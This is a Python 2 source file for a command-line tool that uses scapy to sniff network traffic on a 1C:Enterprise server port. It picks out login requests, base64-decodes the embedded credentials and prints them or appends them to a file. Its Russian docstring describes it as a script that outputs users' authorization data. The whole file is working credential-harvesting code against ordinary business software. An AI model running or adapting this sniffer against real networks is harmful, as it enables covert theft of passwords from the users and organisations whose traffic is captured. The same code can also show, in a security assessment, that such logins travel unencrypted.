# -*- coding: utf-8 -*-
import cli.app
import urllib2
import datetime
import base64


class SnifferApp(cli.app.CommandLineApp):

    def __init__(self):
        super(SnifferApp, self).__init__()
        self.output = None
        self.interface = None
        self.port = None

    def main(self):
        u"""Скрипт прослушивает порт сервера 1С предприятия на интерфейсе и выводит данные авторизации пользователей"""
        self.port = self.params.port
        self.interface = self.params.interface
        self.output = self.params.output
        from scapy.all import sniff

        packet_filter = u'tcp and port {port}'.format(port=self.port)
        print('Listen with filter ' + packet_filter)

        sniff(iface=self.interface, filter=packet_filter, prn=self.find_pass)

    def setup(self):
        super(SnifferApp, self).setup()
        self.add_param(u'--port', u'-p', default=1560,
                       help=u'The port on which the enterprise 1C server listens for incoming connections', type=int)
        self.add_param(u'--interface', u'-i', help=u'Sniffer interface, if not specified, then listen to all')
        self.add_param(u'--output', u'-o', help=u'File to save the credentials found')

    def find_pass(self, packet):
        from scapy.all import raw
        data = raw(packet)
        if '/e1cib/login?' in data:
            data = data.rsplit('/e1cib/login?', 2)[1]
            result_dict = dict()
            for line in urllib2.unquote(data).splitlines():
                if 'ConnectString' in line:
                    result_dict.setdefault('base', line)
                if 'cred' in line:
                    arr_param = line.split('&')
                    for param in arr_param:
                        if 'cred=' in param:
                            try:
                                cred_data = base64.b64decode(param.replace('cred=', ''))
                                result_dict.setdefault('cred', cred_data)
                            except:
                                result_dict.setdefault('cred', 'not base encoded ' + param)

            self.show_data(result_dict)

    def show_data(self, data):
        if not data.__len__():
            return
        data.setdefault('time', datetime.datetime.now())
        output_data = '''{time} find: 
    {base}
    cred: {cred}
'''.format(**data)

        print(output_data.decode('utf-8'))

        if self.output:
            with open(self.output, 'a') as logfile:
                logfile.write(output_data)


def run_sniffer():
    app = SnifferApp()
    app.run()


if __name__ == "__main__":
    run_sniffer()
